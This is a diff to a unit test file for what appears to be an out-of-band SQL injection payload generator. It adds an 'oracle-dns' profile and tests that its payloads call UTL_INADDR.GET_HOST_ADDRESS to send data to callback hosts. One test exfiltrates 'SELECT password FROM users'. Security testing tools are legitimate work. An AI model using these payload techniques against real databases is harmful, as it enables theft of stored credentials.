@@ -56,7 +56,7 @@ class DbmsExpressionTests(unittest.TestCase):
 
 class NewProfileTests(unittest.TestCase):
     def test_all_new_profiles_exist(self):
-        for name in ("postgres-dblink", "mssql-cmdshell", "mysql-stacked", "sqlite-http"):
+        for name in ("postgres-dblink", "mssql-cmdshell", "mysql-stacked", "sqlite-http", "oracle-dns"):
             self.assertIn(name, PROFILES)
 
     def test_postgres_dblink_payload_contains_dblink_connect(self):
@@ -82,7 +82,7 @@ class NewProfileTests(unittest.TestCase):
         self.assertIn("http_get", payload)
 
     def test_new_profiles_in_dbms_and_metadata(self):
-        for name in ("postgres-dblink", "mssql-cmdshell", "mysql-stacked", "sqlite-http"):
+        for name in ("postgres-dblink", "mssql-cmdshell", "mysql-stacked", "sqlite-http", "oracle-dns"):
             self.assertIn(name, DBMS, f"DBMS missing {name}")
             self.assertIn(name, METADATA, f"METADATA missing {name}")
 
@@ -97,6 +97,27 @@ class NewProfileTests(unittest.TestCase):
             DBMS["mssql-cmdshell"].table_expression(0),
             DBMS["mssql"].table_expression(0),
         )
+
+    def test_oracle_dns_table_expr_matches_parent(self):
+        self.assertEqual(
+            DBMS["oracle-dns"].table_expression(0),
+            DBMS["oracle-http"].table_expression(0),
+        )
+
+    def test_oracle_dns_payload_uses_dns_not_http(self):
+        p = PROFILES["oracle-dns"]
+        payload = p.payload("base", "1=1", "tok.oast.site")
+        self.assertIn("UTL_INADDR.GET_HOST_ADDRESS", payload)
+        self.assertIn("tok.oast.site", payload)
+        self.assertNotIn("UTL_HTTP.REQUEST", payload)
+
+    def test_oracle_dns_direct_payloads_use_dns_not_http(self):
+        p = PROFILES["oracle-dns"]
+        payloads = p.direct_payloads("base", "SELECT password FROM users", "run-d", "oast.test")
+        self.assertTrue(payloads)
+        joined = "\n".join(payloads)
+        self.assertIn("UTL_INADDR.GET_HOST_ADDRESS", joined)
+        self.assertNotIn("UTL_HTTP.REQUEST", joined)
 
 
 class DbsExpressionTests(unittest.TestCase):
